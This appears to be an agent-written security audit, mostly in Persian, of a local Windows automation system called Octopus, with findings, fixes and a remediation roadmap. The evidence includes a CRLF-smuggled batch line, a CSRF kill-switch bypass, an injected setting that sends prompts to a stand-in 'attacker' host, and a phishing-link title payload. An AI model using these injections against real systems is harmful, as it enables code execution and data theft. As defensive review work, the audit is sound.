---
type: audit
project: "[[04 - Architect System/architect/PROJECT]]"
status: active
tags: [security, architecture, audit, octopus]
created: 2026-07-16
updated: 2026-07-16
created_by: agent
sources:
  - "305-agent adversarial workflow wf_35e72243-6ad (21 finder dimensions × 3 refutation lenses)"
  - "probe-verified live tree F:\\backup 2026-07-16 (3 High findings re-confirmed by hand against real code)"
---

# Octopus — Security & Architecture Review (2026-07-16)

> روش: ۲۱ محورِ یابنده روی درختِ **زنده** `F:\backup`، هر یافته با ۳ عدسیِ خصمانه (دسترس‌پذیری · مدلِ تهدید · صحتِ شاهد) راستی‌آزمایی؛ رأیِ اکثریت (۲ از ۳ «رد») یافته را می‌کشد. از ۹۴ یافتهٔ خام، **۸۴ تأیید، ۱۰ رد**. سه یافتهٔ High را **خودم دستی** با کدِ واقعی دوباره تأیید کردم. قانونِ حاکم: «بدون شاهد، ادعا نیست».

---

## 🟦 خلاصهٔ مدیریتی (یک صفحه — برای مخاطبِ غیرفنی)

اختاپوس یک سیستمِ تک‌کاربره روی یک دستگاهِ ویندوز است. همهٔ سرورهایش فقط روی همان دستگاه (`127.0.0.1`) گوش می‌دهند، پس **از اینترنت قابلِ حمله نیست** — و همین باعث شد راستی‌آزماها بیشترِ هشدارهای کلاسیکِ «DDoS/rate-limit» را به‌درستی پایین بیاورند. **هیچ آسیب‌پذیریِ Critical باقی نماند.**

اما سه مشکلِ **High** پیدا شد که هر سه از **یک باورِ غلط** می‌آیند: کد فرض می‌کند «هر چیزی که از خودِ این دستگاه بیاید، یعنی خودِ مالک کلیک کرده». این غلط است، به دو دلیل: (۱) هر برنامهٔ دیگری روی همان دستگاه هم `127.0.0.1` را می‌بیند، و مهم‌تر (۲) **هر صفحهٔ وبی که تو در مرورگر باز کنی می‌تواند بی‌صدا به این سرورها فرمان بفرستد** (حملهٔ CSRF). نتیجه‌اش این است:

1. **یک صفحهٔ وبِ مخرب می‌تواند کدِ دلخواه روی دستگاهت اجرا کند.** پنلِ داشبورد یک مقدار را بدونِ پاک‌سازی داخلِ فایلی می‌نویسد که در هر بوت به‌عنوان اسکریپت **اجرا** می‌شود. این تنها راهِ اجرای کدِ خودسرانه در کلِ سیستم است — و همان دستگاهی است که کلیدهای API، توکنِ تلگرام و مؤثرهای پول رویش است.
2. **کلیدِ خاموشیِ اضطراری (STOP) قابلِ دور زدن است.** همان سرور به هر فرمانِ بی‌احرازهویت اجازه می‌دهد فایلِ STOP را پاک کند و بدن را دوباره روشن کند — یعنی «خاموش‌کردنِ» تو که همین الان ساعت ۱۶:۰۷ زده‌ای، امن نیست.
3. **پنلِ داشبورد بی‌صدا سپرهای امنیتی را خاموش می‌کند.** یک ذخیرهٔ ساده در پنل، ۲۴ خط از ۲۹ خطِ فایلِ تنظیمات را پاک می‌کند — از جمله دو گاردِ ضدِ جعل و مسیریابیِ مغزِ محلی — بی‌آنکه چیزی به تو بگوید.

**راهِ حلِ هر سه، یک تغییرِ ~۴۰ خطی است:** یک دروازهٔ احرازِ هویتِ مشترک که همهٔ سرورها قبل از هر فرمان از آن رد شوند. این یک تغییر، تنها راهِ اجرای کدِ سیستم را می‌بندد و کلیدِ خاموشیِ تو را همزمان تعمیر می‌کند.

فراتر از این سه، سیستم دو ضعفِ **ساختاری** دارد که ده‌ها یافتهٔ کوچک‌تر از آن‌ها می‌جوشد: (الف) **سیستم کور است** — مغز هر چرخه می‌فهمد که مریض است (`coherence=0.234`، ۷ عضو کهنه) ولی هیچ‌کس خبردار نمی‌شود؛ ناظر و تنها اعلان‌کننده هر دو *داخلِ* بدن‌اند و وقتی بدن می‌میرد خودشان هم می‌میرند. (ب) **آزمون‌ها به کدِ مرده اشاره می‌کنند** — سوئیتِ سبز، ناظری را آزمایش می‌کند که ویندوز هرگز اجرا نمی‌کند؛ منطقِ واقعیِ نظارت هیچ آزمونی ندارد.

**توصیهٔ اصلی:** در ۳۰ روزِ اول فقط دو کار — دروازهٔ احراز هویت (RC1) و رفعِ split-brainِ ناظر + یک اعلان‌کنندهٔ بیرون‌بدنی (RC3). این دو، هم بزرگترین خطرِ امنیتی و هم بزرگترین خطرِ «مرگِ خاموش» را می‌بندند.

---

## 🎯 دامنه و مرزها (چه چیزی ممیزی *نشد*)

| دامنه | وضعیت |
|---|---|
| `_ops/` (هستهٔ ارگانیسم)، `04-architect/scripts`، `4d_system`, `app/src`, `_launchpad`, `survival-gateway`, `03-Projects/**/*.py` | ✅ ممیزی شد |
| `**/_code/` (۱۶۹ فایل پایتون؛ Mining/Lead/Ziman + `architect/_code`) | ⛔ **ممیزی نشد** — قانونِ اساسیِ ولت آن را ممنوع می‌کند (`.agentignore`). این ممیزی **نمی‌تواند بگوید آن کد امن است** — فقط نگاهش نکرد. |
| PII شریک، دادهٔ ژنوم/EEG، الگوهای `*key*`/`*secret*`/`*.env` | ⛔ ممیزی نشد (special-category، `.agentignore`) |
| کتابخانه‌های third-party (venv/site-packages/node_modules) | ⛔ عمداً رد شد — فقط کدِ خودی ممیزی شد |

**اگر می‌خواهی داخلِ `_code` هم دیده شود، رأیِ صریحِ تو لازم است** (طبق قاعدهٔ ۲ قانونِ اساسی، ایجنت خودش مرز را دور نمی‌زند).

**مدلِ تهدیدِ به‌کاررفته** (به ترتیبِ خطرِ واقعی روی این معماری): (۱) بلعِ محتوای نامعتبر — تلگرام/ایمیل → مغز → اقدام؛ (۲) اقداماتِ بیرونی با اثرِ واقعی — ارسالِ زندهٔ تلگرام، پول، نوشتنِ فایل، خودمختاریِ کد؛ (۳) بدافزارِ محلی/پروسهٔ دیگر روی `127.0.0.1` بدونِ احراز هویت؛ (۴) secret روی دیسک؛ (۵) زنجیرهٔ تأمین.

---

## 📊 اولویت‌بندیِ ریسک — `Risk = Severity × Exploitability × Business Impact`

| # | ID | یافته | Sev | Expl | Risk | ریشه |
|---|---|---|---|---|---|---|
| 1 | **CWE-93** | تزریقِ فرمان به `OCTOPUS-flags.cmd` → اجرای کد در هر بوت (بی‌احرازهویت، CSRF-پذیر) | 🟠 High | آسان | **بیشینه** | RC1+RC2 |
| 2 | **OCT-AUTHZ-3** | دور زدنِ کلیدِ خاموشی: پاک‌کردنِ `STOP-ORGANISM` بی‌احرازهویت | 🟠 High | آسان | **بیشینه** | RC1 |
| 3 | **OWASP-A05** | پنل بی‌صدا ۲۴/۲۹ خطِ فلگ را پاک می‌کند (گاردهای امنیتی + مسیریابیِ مغز) | 🟠 High | آسان | **بیشینه** | RC2 |
| 4 | GAP-1 (منتقد) | محتوای وبِ نامعتبر بدونِ escape داخلِ پیامِ HTMLِ تلگرام | 🟡 Med | متوسط | بالا | RC3 |
| 5 | OCT-AUTHZ-1/2 | `/save` بدونِ auth/CSRF + حذفِ گاردها | 🟡 Med | آسان | بالا | RC1+RC2 |
| 6 | OCT-GODCLASS-1 | split-brainِ ناظر: تست کدِ مرده را می‌آزماید | 🟡 Med | متوسط | متوسط | RC3 |
| 7–12 | OCT-PERF/DB/SUPPLY | timeout پول‌سوز، خطای واحدِ زمانِ chrono، پین‌نشدنِ ایمیج، بدونِ lockfile | 🟡 Med | — | متوسط | RC4/RC5 |
| … | ۷۲ مورد Low | ضمیمهٔ A (گروه‌بندی‌شده بر محور) | 🟢 Low | — | پایین | همه |

> **چرا هیچ Critical نیست:** عدسیِ مدلِ تهدید هر ادعای Critical را در برابرِ واقعیتِ «تک‌کاربره، بدونِ ingressِ عمومی» سنجید. یافتهٔ CWE-93 از منظرِ RCEِ خالص Critical است، ولی چون بردارش «مرورگرِ خودِ مالک» است نه یک listenerِ شبکه، راستی‌آزماها محافظه‌کارانه High گذاشتند. من این را محترم می‌شمارم و صریح می‌گویم: **در عمل، این نزدیک‌ترین چیز به Critical در سیستم است.**

---

## 🟠 یافته‌های High (سه‌گانه، هر سه دستی-تأییدشده)

### F-1 · CWE-93 — تزریقِ فرمان به فایلِ اجرایی → اجرای کدِ خودسرانه در بوت

| فیلد | مقدار |
|---|---|
| **شناسه** | CWE-93 (CRLF Injection) + CWE-78 (OS Command Injection) + CWE-352 (CSRF) · OWASP A03 |
| **موقعیت** | [`_ops/dashboard/server.py:824-825`](_ops/dashboard/server.py) (منبع) → سینک: [`_ops/RUN-ORGANISM.bat:21`](_ops/RUN-ORGANISM.bat) |
| **توضیح فنی** | `do_POST /save` بدنه را `parse_qs` می‌کند و به `_write_env` می‌دهد. همهٔ فیلدها allowlist/`int()`-شده‌اند **به‌جز** `OCTOPUS_PROFILE` که خط ۸۲۵ عیناً داخلِ فایل می‌نویسد: `lines.append(f"set OCTOPUS_PROFILE={profile}")`. `parse_qs` مقدارِ `%0D%0A` را به CRLFِ واقعی رمزگشایی می‌کند، پس مقدار از خطِ `set` بیرون می‌زند و **خطِ batchِ جدید** می‌شود. `RUN-ORGANISM.bat:21` این فایل را `call` می‌کند → cmd.exe آن را با دسترسیِ مالک اجرا می‌کند. |
| **شاهد** | من قدمِ `parse_qs→emit` را اجرا کردم: بدنهٔ `OCTOPUS_PROFILE=paper-full%0D%0Aset MALICIOUS=pwned` مقدار `'paper-full\r\nset MALICIOUS=pwned'` تولید کرد؛ فایل خطِ دومِ مهاجم‌کنترل را گرفت. سینک: `if exist "...OCTOPUS-flags.cmd" call "...OCTOPUS-flags.cmd"`. |
| **Severity** | 🟠 High (در عمل نزدیکِ Critical) |
| **Exploitability** | آسان — `application/x-www-form-urlencoded` یک CORS «simple request» است؛ بدونِ preflight از هر صفحهٔ وب ارسال می‌شود. |
| **Business Impact** | **Integrity + Confidentiality** — اجرای کد به‌عنوانِ مالک روی دستگاهِ حاوی کلیدهای API، توکنِ تلگرام، مؤثرهای پول و کلِ ولت. کاشتِ بک‌دورِ ماندگارِ بوت‌تایم. |
| **راه‌حل فوری** | یک خط، با allowlistی که در همان فایل خط ۸۳ هست: `if profile not in PROFILES: profile = "paper-full"` (کلیدها: `bare`/`paper-full`/`live`). |
| **راه‌حل بلندمدت** | سه لایه: (۱) رد کردنِ هر مقدارِ حاویِ `CR/LF/&/|/>` برای *همهٔ* فیلدها؛ (۲) تنظیمات را از فایلِ **اجرایی** به دادهٔ inert (`KEY=VALUE` خوانده‌شده در پایتون) تبدیل کن و `call` را از bat بردار — تزریقِ آینده مفسری برای اجرا ندارد؛ (۳) توکنِ CSRF روی هر endpointِ تغییردهنده. |
| **منابع** | CWE-93, CWE-78, CWE-352; OWASP CSRF Prevention Cheat Sheet |
| **دسترس‌پذیری** | زنده. `ThreadingHTTPServer(("127.0.0.1", 8770))`؛ `grep csrf|origin|referer|authorization` روی هر ۵ سرور = صفر گاردِ واقعی. |

### F-2 · OCT-AUTHZ-3 — دور زدنِ کلیدِ خاموشیِ اضطراری

| فیلد | مقدار |
|---|---|
| **شناسه** | CWE-306 (Missing Authentication for Critical Function) + CWE-352 · OWASP A01 |
| **موقعیت** | [`_ops/live/server.py:255`](_ops/live/server.py) (`do_action`) ← dispatch در `do_POST:782-788` |
| **توضیح فنی** | `do_POST` روی پورت ۸۷۷۳ بدنه را `json.loads` می‌کند و `do_action(body["kind"])` را **بدونِ auth، بدونِ Origin، بدونِ Content-Type** صدا می‌زند. docstring فرضِ غلط را صریح می‌گوید: «صفحهٔ محلی = کلیکِ مالک». `kind=restart-organism` فایلِ `STOP-ORGANISM` و `RESTART-REQUESTED` را می‌نویسد؛ `RUN-ORGANISM.bat:25-31` این ترکیب را «دوباره بوتم کن» می‌فهمد (`del STOP-ORGANISM; goto loop`) و threadِ `_relauncher` وقتی پورت مرده است خودِ bat را spawn می‌کند. |
| **شاهد** | `if kind == "restart-organism": (ops/"STOP-ORGANISM").write_text(...); (ops/"RESTART-REQUESTED").write_text("live",...)` + سینکِ bat: `if exist STOP-ORGANISM ( if exist RESTART-REQUESTED ( del STOP-ORGANISM; goto loop ))`. |
| **Severity** | 🟠 High |
| **Exploitability** | آسان — CSRF با `<form enctype="text/plain">` (Content-Type بازرسی نمی‌شود). |
| **Business Impact** | **Availability + Integrity** — کلیدِ خاموشی تنها گاردِ ایمنیِ کارآمدِ فعلی است و همین الان (STOP ۱۶:۰۷) این تفاوتِ «خاموش» و «روشن» است. `start-cortex` مغزِ پول‌سوز را هم احیا می‌کند. |
| **راه‌حل فوری** | bearer-token پر-بوت روی `do_POST` + رد اگر `Content-Type != application/json` + Origin allowlist. **docstring را هم اصلاح کن** — فرضِ «محلی=مالک» خودِ باگ است. |
| **راه‌حل بلندمدت** | حذفِ فایلِ kill نباید اصلاً از HTTP قابل‌دسترس باشد. احیا را owner-only و out-of-band کن (تلگرام Command Center که allowlistِ درست و fail-closed دارد — `center.py:478` روی `from.id`). اگر restartِ HTTP لازم است، **یک‌طرفه**‌اش کن: اجازهٔ ساختِ STOP، هرگز حذفش. |
| **منابع** | CWE-306, CWE-352, CWE-732; OWASP A01:2021 |
| **دسترس‌پذیری** | route بی‌قید (بدونِ فلگ)، هرگاه پروسهٔ live cockpit (`RUN-LIVE.bat`, `127.0.0.1:8773`) اجرا شود. |

### F-3 · OWASP-A05 — پنل بی‌صدا سپرهای امنیتی را revoke می‌کند

| فیلد | مقدار |
|---|---|
| **شناسه** | OWASP A05:2021 (Security Misconfiguration) + CWE-16 |
| **موقعیت** | [`_ops/dashboard/server.py:821-842`](_ops/dashboard/server.py) (`_write_env`) |
| **توضیح فنی** | `_write_env` **هرگز فایلِ موجود را نمی‌خواند**؛ فقط ۱ هدر + `OCTOPUS_PROFILE` + ۱۹ نامِ `WIRE_FLAGS` + ۵ نامِ `CADENCE_FLAGS` = ۲۶ خط می‌نویسد و کلِ فایل را atomic جایگزین می‌کند. فایلِ زنده ۲۹ خطِ `set` دارد؛ **۲۴ خط نابود می‌شود** — از جمله `OCTOPUS_WIRE_HUMAN_APPEND_GUARD=1` (گاردِ ضدجعل)، `HH_HUMAN_GUARD_STRICT=1` (fail-closed)، `CORTEX_LOCAL_FIRST=1` و همهٔ `OLLAMA_*`. نکته: `_read_env_overrides()` **همین حالا هر ۲۹ خط را parse می‌کند** — دادهٔ لازم برای حفظشان موجود و بلااستفاده است. |
| **شاهد** | `lines = [header]; profile = form.get("OCTOPUS_PROFILE"...); for name,_,_ in WIRE_FLAGS: lines.append(f"set {name}=...")` — هیچ خواندنِ فایلِ موجود نیست. |
| **Severity** | 🟠 High |
| **Exploitability** | آسان — یک POSTِ خالی `form={}` همهٔ ۱۹ فلگ را `=0` می‌کند. |
| **Business Impact** | **Integrity + Compliance** — یک تپ روی دکمهٔ فلگِ تلگرام یا یک POST، گاردِ ضدجعلِ human-append را (که «فیکسِ P0 امنیتیِ جلسهٔ ۴۶» بود) خاموش می‌کند → `is_human` در بوتِ بعدی دوباره جعل‌پذیر. همزمان `CORTEX_LOCAL_FIRST` حذف می‌شود → مغز به ابرِ پولی route می‌کند و سقفِ AU$30 را می‌سوزاند. |
| **راه‌حل فوری** | seed از parse موجود: `existing = _read_env_overrides(); managed = {...}; lines += [f"set {k}={v}" for k,v in existing.items() if k not in managed]`. + تستِ round-trip: `set(parse(write(parse(f)))) >= set(parse(f))`. |
| **راه‌حل بلندمدت** | دو پروسه نباید یک فایلِ دست‌ساز را destructive بازتولید کنند. یا (الف) سطح را جدا کن (`OCTOPUS-flags.local.cmd` مخصوصِ داشبورد که bat بعدِ فایلِ اصلی `call` کند)، یا (ب) فایل را build-artifactِ یک رجیستریِ واحدِ فلگ کن (single source of truth، شاملِ گاردها). |
| **منابع** | OWASP A05:2021; CWE-16; OWASP Secure Configuration (fail-safe defaults) |
| **دسترس‌پذیری** | دو caller زنده: `do_POST:895` + `approval_channel.py:2252` (`verb == "flaggo"`). |

---

## 🟡 دو شکافی که ۲۱ یابنده از دست دادند (منتقدِ کامل‌بودن)

### GAP-1 · محتوای وبِ نامعتبر بدونِ escape داخلِ پیامِ HTMLِ تلگرام

**زنجیرهٔ کامل، همه در درختِ زنده، همه flag-on:** `heart/work_pump.py:159` (وب‌ریسرچِ زنده — `work-log.jsonl` رکوردِ `web_research ok:true n_hits:12` دارد) → `cortex/web_research.py:79-83` عنوانِ نتیجه را از DuckDuckGo عیناً scrape می‌کند (فقط تگ strip می‌شود، `< > &` می‌مانند) → `discoveries.record` → `discoveries.py:82` `lines()` بدونِ `html.escape` برمی‌گرداند → **سینکِ A** `wiring.py:2188` پیامِ `<b>...</b>` proactive می‌فرستد؛ **سینکِ B** `approval_channel.py:651` منوی learned. `send_text` با `parse_mode:HTML` می‌فرستد و تنها پیش‌پردازش `_redact` (اسکرابرِ **secret**، نه HTML) است.

**چرا مهم است:** مهاجمی که صفحه‌ای را رتبه دهد با عنوانِ `<a href="http://evil">کیف‌پولت را تأیید کن</a>`، **لینکِ کلیک‌پذیر داخلِ پیامی که مالک به رباتِ خودش اعتماد دارد** تزریق می‌کند — فیشینگ مستقیم. یک `<` نامتوازن هم Telegram 400 می‌دهد → پیام «چیزی یاد گرفتم» **بی‌صدا drop** می‌شود. سازنده‌ها discipline را می‌دانند: `approval_channel.py:636` هفده خط بالاتر `html.escape(d['q'])` دارد — حذف دقیقاً روی مسیرِ وبِ نامعتبر است.

| Severity | Exploitability | راه‌حل فوری | راه‌حل بلندمدت |
|---|---|---|---|
| 🟡 Medium | متوسط (نیازمندِ SEO/ranking) | یک `html.escape()` در `discoveries.py:82` یا در دو سینک | escape سیستماتیک روی هر متنِ نامعتبر که به `parse_mode:HTML` می‌رسد؛ تستِ «تگ در عنوان → پیام درست render/reject» |

### GAP-2 · endpointِ مغزِ محلی env-overridable است (رأیِ SSRF غلط بود)

رأیِ `sec-ssrf-path` گفت «هر fetchِ بیرونی host را pin می‌کند». **غلط.** `cortex/local_llm.py:23` = `BASE_URL = os.environ.get("OLLAMA_BASE_URL", "http://127.0.0.1:11434")` و `_post` به هر چه `BASE_URL` باشد POST می‌کند، **بدونِ host-check** — برخلافِ `tg_api.py` (allowlistِ سختِ `api.telegram.org`). پس وعدهٔ docstring «هیچ داده‌ای دستگاه را ترک نمی‌کند» به یک env-var وابسته است نه به کد. **تشدیدِ CWE-93:** یک POST می‌تواند `set OLLAMA_BASE_URL=http://attacker:11434` تزریق کند → در بوتِ بعدی هر پرامپتِ «محلی، $0، خصوصی» (شاملِ `synthesis._build_prompt` که GOALS + audit gaps + یافته‌های وب را حمل می‌کند) exfil می‌شود. **Severity: Low/Medium** (پشتِ CWE-93)، ولی clearanceِ این خط باید برعکس شود.

---

## 🧩 پنج ریشهٔ زیرین (RC) — که ۸۴ یافته از آن‌ها می‌جوشد

| RC | عنوان | یافته‌های تحتِ پوشش | یک تغییرِ ریشه‌ای | تلاش |
|---|---|---|---|---|
| **RC1** | `127.0.0.1` مرزِ احراز هویت پنداشته شده؛ **هیچ** route احراز هویت نمی‌کند | AUTHZ-1/3/4, CWE-93, API-1/2, PERF-1/2 | یک دروازهٔ مشترک (`_ops/httpauth.py` ~۴۰ خط) که هر `do_GET/do_POST` اول صدا بزند: bearer-tokenِ پر-بوت (سیستم در `organism.py:189` یکی می‌سازد) + CSRF روی POSTهای تغییردهنده؛ وگرنه 401 | **۱–۲ روز** |
| **RC2** | `OCTOPUS-flags.cmd` = تنظیماتِ **اجرایی**، از مدلِ ناقص بازتولیدشده، بدونِ قفلِ بین‌پروسه | CWE-93, A05, AUTHZ-2, CWE-362 | فلگ‌ها = فایلِ JSONِ inert خوانده‌شده با `opslib.LockedJson`؛ writer روی کلِ کلیدها read-modify-write کند، هرگز از subset بازتولید نکند، هرگز syntaxِ shell ننویسد | ۱ روز + ۱–۲ روز مهاجرتِ مصرف‌کننده‌ها |
| **RC3** | ناظر و تنها push-notifier، split-brain، **داخلِ بدن**، و write-only (سیستمِ کور که سالم به نظر می‌رسد ولی می‌میرد) | GODCLASS-1, DEVOPS-1, DXDOC-1..5, RESIL-1/2, OBSERV-1..6 | (الف) حذفِ `_ops/organism-watchdog.ps1`ِ مرده، نگه‌داشتنِ twinِ `scripts/`، repoint تست + docs، cap متقارن برای organism؛ (ب) یک notifierِ ~۲۰ خطیِ مشترک روی `tg_api.py` که مرگ/آستانه/give-up پیام بفرستد نه فقط لاگ | ۱ روز ناظر + ۱ روز notifier + ۱ روز de-dup |
| **RC4** | مرزِ package/venv/lockfile نیست؛ کرنلِ مشترک داخلِ package دامنه‌ای، ارگانیسم روی مفسرِ سراسری | COUPLING-01/02/04, DEPS-1, SUPPLY-2, CWE-1357/1104/829, GODCLASS-2/3/4 | `opslib` و برگ‌های مشترک را به package نصب‌شدهٔ top-level ببر؛ importها canonical؛ یک lockfile برای numpy/PyYAML | **۳–۵ روز، واقعاً پرخطر** (COUPLING-04 ثابت می‌کند graph با reorderِ ساده کرش می‌کند — پشتِ سوئیت، ماژول‌به‌ماژول) |
| **RC5** | chrono write-first ساخته شد؛ مسیرِ read، schema-versioning و retention هرگز تمام نشد | DB-01..06, PERF-1/resource | لایهٔ migration (`PRAGMA user_version` + migrations مرتب) + read-model با دو ایندکسِ درست + prune/retention + فیکسِ دو باگِ reader (واحدِ زمان، نامِ جدول) | ~۲ روز |

---

## 🗺️ رودمپ ۳۰-۶۰-۹۰ روزه (فقط High + ریشه‌های پرخطر)

### روز ۰–۳۰ — **بستنِ خونریزی** (خطرِ امنیتی + مرگِ خاموش)
1. **RC1 · دروازهٔ احراز هویتِ مشترک** (`_ops/httpauth.py`, ~۴۰ خط) → همزمان F-1 (CWE-93) و F-2 (AUTHZ-3) را می‌بندد. **این اولین حرکت است.**
   - Quick-fixِ فوری همان امروز، تا دروازه آماده شود: خطِ allowlistِ `OCTOPUS_PROFILE` (F-1) + یک‌طرفه‌کردنِ حذفِ STOP (F-2).
2. **F-3 · seed از parse موجود در `_write_env`** + تستِ round-trip «هیچ کلیدِ `set` گم نشود».
3. **RC3-الف · رفعِ split-brainِ ناظر** — کامنتِ وارونهٔ `_ops/organism-watchdog.ps1:11` را با واقعیت جایگزین کن، تستِ `test_heart_work.py:133` را به فایلِ ثبت‌شدهٔ `scripts/` repoint کن، capِ organism را متقارنِ cortex اضافه کن.
   > ⚠️ ردهٔ «مهم» (کد + schtasks): طبق ماتریسِ خودمختاری این‌ها بدونِ رأیِ صریحِ تو اعمال نمی‌شوند. من **پیشنهاد + دیف** می‌دهم، تو تأیید کن.

### روز ۳۰–۶۰ — **بستنِ کوری**
4. **RC3-ب · notifierِ بیرون‌بدنی** روی `tg_api.py` — مرگ/آستانهٔ `coherence`/give-upِ ناظر → پیامِ تلگرام نه فقط لاگ. (مسیرِ «سیستم می‌داند → مالک می‌داند» را می‌بندد.)
5. **GAP-1 · `html.escape` روی مسیرِ discoveries→تلگرام** + **GAP-2 · host allowlist روی `local_llm.BASE_URL`**.
6. **RC5 · لایهٔ migration + read-model chrono** — فیکسِ باگِ واحدِ زمان (`velocity=0 forever`) و جداول phantomِ cockpit؛ retention/VACUUM.
7. **RC2 (فاز ۱) · قفلِ بین‌پروسه روی فایلِ فلگ** (`LockedJson`) + tempِ یکتا (CWE-362).

### روز ۶۰–۹۰ — **بستنِ بدهیِ ساختاری**
8. **RC4 (پشتِ سوئیت، ماژول‌به‌ماژول)** — `opslib` را به packageِ نصب‌شده ببر، importها را canonical کن، double-loadِ `consolidation.py` را بکش، یک lockfile اضافه کن. **پرخطرترین کار — آخر، با آزمونِ سبز در هر قدم.**
9. **DevOps · یک pre-commit hookِ محلی** (بدونِ CI ابری، ~۲۰ خط) که سوئیت + اسکنِ secret را قبلِ commit اجرا کند + گیتِ صداقتِ «مسیرِ فایل در schtasks == مسیری که تست بارگذاری می‌کند».
10. پاکسازیِ ۷۲ یافتهٔ Low به‌صورتِ دسته‌ایِ tune (ضمیمهٔ A) — بیشترشان یک‌دو خط‌اند و پشتِ همان ریشه‌ها می‌افتند.

---

## ✅ چه چیزی درست بود (نه padding — جاهایی که واقعاً امن‌اند)

- **ایمیل → مغز مهارشده است:** `legs/email_inbound.py` فقط Gmail read-only و keyword-only است، بدونِ LLM، فقط str به lead-inbox می‌نویسد. `OCTOPUS_WIRE_EMAIL` حتی set نیست.
- **خروجیِ LLM از طریقِ cortex به eval/subprocess/path نمی‌رسد:** تنها مسیرِ auto-apply به `change_level=="tune"` + نامِ knobِ hard-coded محدود است؛ پیشنهادهای synthesis همه `auto_applicable:False`. `OCTOPUS_AUTONOMY_FREE` فقط `_log/ledger_note` می‌کند، executor ندارد.
- **سطحِ امتیازِ ویندوز: بدونِ escalation** — هر دو تسک `RunLevel: Limited`, `UserId: Armin`؛ هیچ تسکِ SYSTEM/elevated نیست.
- **سطحِ فرمانِ تلگرام → مغز: هیچ** — `approval_channel.py` هرگز `model_router` را صدا نمی‌زند؛ متنِ پیام از Command Center به مغز نمی‌رسد.
- **هستهٔ `_ops` عمدتاً stdlib-only** — یک قوتِ واقعیِ زنجیرهٔ تأمین (به‌جز numpy/PyYAMLِ undeclared در DEPS-1).

---

## 🔴 ۱۰ یافتهٔ ردشده (چرا راستی‌آزمایی مهم بود)

راستی‌آزماها این‌ها را کشتند — اکثراً روی **دسترس‌ناپذیری** (flag-off، test-only، importِ خودمحافظ). این‌ها همان یافته‌های «قابل‌قبول ولی غلط»‌اند که یک ممیزیِ بدونِ گیت گزارش می‌کرد:

| ID | چرا رد شد |
|---|---|
| CWE-20 (arithmetic TypeError باعثِ مرگِ batch) | ۳/۳ رد: مسیرِ زنده `score_lead` هر `TypeError` را در `except Exception` می‌گیرد؛ یابنده «pure scorer» را مستقیم تست کرده بود نه مسیرِ واقعی. |
| CWE-94 / CWE-693 (self_code بدونِ enabled-check) | `wiring.py` همیشه `TelegramApprovalChannel` پایه را می‌سازد نه `Unified`؛ مسیرِ آسیب‌پذیر در سیستمِ اجرا شونده reachable نیست. |
| OCT-AUTHZ-5 (`AUTONOMY_FREE` مجوزِ auto-apply می‌دهد) | `run()` فقط وقتی `ACT_AUTO.exists()` رسیده می‌شود؛ early-return قبلش. |
| OCT-COUPLING-03 (namespace shadowing) | هر ۳ importِ زنده خودمحافظ‌اند (`sys.path.insert` قبلشان). |
| OCT-SCALE-3, OCT-DEPS-4, PERFCACHE-5, RESIL-6, API-4 | همه روی flag-off / test-only / early-guard رد شدند. |

---

## ⚠️ یادداشتِ اعتماد (خودِ همین گزارش)

این گزارش محصولِ ۳۰۵ ایجنت است؛ اما **سه یافتهٔ High را من دستی با کدِ واقعی دوباره تأیید کردم** (اجرای واقعیِ `parse_qs`، خواندنِ `RUN-ORGANISM.bat:21`، `do_action` و مسیرِ bat). یافته‌های Medium/Low روی حرفِ راستی‌آزماها گزارش شده‌اند و **قبل از اعمالِ هر فیکس باید همان‌طور که F-1..F-3 را چک کردم، دستی تأیید شوند** — به‌ویژه شماره‌خط‌ها که ممکن است با drift جابه‌جا شده باشند. این ولت تاریخچهٔ «گزارشِ مطمئنِ غلط» دارد؛ نه به این گزارش هم اعتمادِ کور کن.

---

## ضمیمهٔ A — ۷۲ یافتهٔ Low (گروه‌بندی بر ۶ محور)

<!-- جدولِ کاملِ Low — هر ردیف: ID · موقعیت · مشکل · راه‌حل فوری. برای اعمال، هر مورد را جدا تأیید کن. -->

### محور 1 — معماری و کد (17 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| CWE-681 | `F:/backup/_ops/heart/producers.py:134 (query) + F:/backup/_ops/heart/p` | heart's beat sensor reads epoch-milliseconds as epoch-seconds -> velocity_meter reports 0 beats forever (live  | Push the filter into SQL and decode the unit explicitly, dropping _parse_ts for this column (its type is fixed by chrono |
| OCT-DB-02 | `F:/backup/_ops/budget/cockpit_readmodel.py:324` | cockpit queries chrono tables 'beat' and 'human_judgment' that have never existed -> Telegram card renders a g | Point the reads at the real schema: `if "heartbeat" in tables:` / `SELECT COUNT(*), MAX(wall_ts) FROM heartbeat`, and de |
| OCT-DB-03 | `F:/backup/_ops/chrono.py:148` | the only index on the hot table is on a column no query ever filters, while the column every reader scans is u | Two lines: drop the index that serves nothing and index the column that is actually queried — `DROP INDEX idx_heartbeat_ |
| OCT-GODCLASS-2 | `F:\backup\_ops\budget\approval_channel.py:139-3318 (class)` | TelegramApprovalChannel is a 3,180-line / 108-method god class guarding the money-approval gate, with a 346-li | Extract the presentation layer without touching gate semantics |
| OCT-GODCLASS-3 | `F:\backup\_ops\wiring.py:1-2196 (module)` | wiring.py is a 2,196-line procedural god module: 61 top-level functions, zero classes, ~30 unrelated subsystem | Stop the growth and make the seam visible before splitting |
| OCT-GODCLASS-4 | `F:\backup\_ops\organism.py:147-628 (main)` | organism.py::main() is a 482-line function with 36 inline try/except blocks, 68 locals and nesting depth 8 — b | Extract the two pieces that are pure functions of their inputs and currently untestable |
| OCT-COUPLING-01 | `F:\backup\_ops\wiring.py:771 (flat import) and F:\backup\_ops\wiring.p` | wiring.py imports neural/consolidation.py both flat and package-style, loading it twice; canonical_consolidati | Change wiring |
| OCT-COUPLING-02 | `F:\backup\_ops\budget\opslib.py:32 (kernel definition)` | Shared kernel opslib lives inside the budget/ domain package, forcing 91% of its dependents to sys.path-hack i | Move the kernel out of the domain package: create F:\backup\_ops\opslib |
| OCT-COUPLING-04 | `F:\backup\_ops\doctor\doctor.py:718, :735, :913 (deferred edges) again` | Three doctor cycles are held together only by in-function imports; hoisting any of them to module level — the  | Pin the invariant so the refactor cannot silently happen: add an explicit comment at doctor/doctor |
| CWE-362 | `F:\backup\_ops\dashboard\server.py:818-840` | OCTOPUS-flags.cmd is written by two processes but guarded only by an in-process threading.Lock, with a fixed s | Two-line change: give the temp file a unique name — `tmp = ENV_FILE |
| OCT-DEPS-1 | `F:\backup\_ops\budget\opslib.py:196-206 (import site)` | "stdlib-only" _ops is not: PyYAML is an undeclared hard runtime dep on the live budget path, justified only by | Create F:\backup\_ops\requirements |
